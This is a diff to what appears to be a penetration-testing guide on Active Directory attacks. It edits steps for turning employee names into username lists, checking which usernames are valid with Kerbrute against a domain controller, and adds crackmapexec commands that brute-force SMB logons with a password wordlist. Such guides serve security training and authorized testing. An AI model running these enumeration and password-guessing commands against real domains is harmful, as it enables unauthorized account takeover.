@@ -2313,6 +2313,10 @@ After gathering employee names from OSINT research (e.g., LinkedIn, company webs
 * Jill Johnson  
 * Jane Doe  
 
+```bash
+nano ~/names.txt
+```
+
 We can create a custom list using an automated list generator such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.
 
 **Install**
@@ -2326,7 +2330,7 @@ chmod +x username-anarchy
 **Usage**
 
 ```bash
-./username-anarchy -i /home/names.txt
+./username-anarchy -i ~/names.txt > ~/usernames.txt
 ```
 
 > While automated tools accelerate list generation, investing time in identifying an organization’s exact username convention significantly improves attack success rates.
@@ -2334,7 +2338,7 @@ chmod +x username-anarchy
 </details>
 
 <details>
-<summary><h4>Enumerating valid usernames with Kerbrute</h4></summary>
+<summary><h4>Enumerating valid usernames</h4></summary>
 
 Before initiating password-based attacks, verifying username validity prevents wasted effort on non-existent accounts. Kerbrute streamlines this process.
 
@@ -2349,7 +2353,7 @@ sudo mv kerbrute /usr/local/bin/
 **Usage**
 
 ```bash
-kerbrute userenum --dc <DC IP> --domain exampledomain.local /home/names.txt
+kerbrute userenum --dc <DC IP> -d exampledomain.local ~/usernames.txt
 ```
 
 Example output
@@ -2366,9 +2370,25 @@ Example output
 </details>
 
 <details>
-<summary><h4>Launching a brute-force attack with NetExec</h4></summary>
+<summary><h4>Launching a brute-force attack</h4></summary>
 
 Once we've identified the naming convention and gathered employee names or prepared a username list, we can launch a brute-force attack against the target Domain Controller using a tool like NetExec. By leveraging the SMB protocol, we can send logon attempts directly to the DC. 
+
+**Option 1: crackmapexec**
+
+Wordlist
+
+```bash
+crackmapexec smb <DC IP> -u ~/usernames.txt -p /usr/share/wordlists/fasttrack.txt
+```
+
+Username
+
+```bash
+crackmapexec smb <DC IP> -u john -p /usr/share/wordlists/fasttrack.txt
+```
+
+**Option 2: netexec**
 
 **Usage**
 
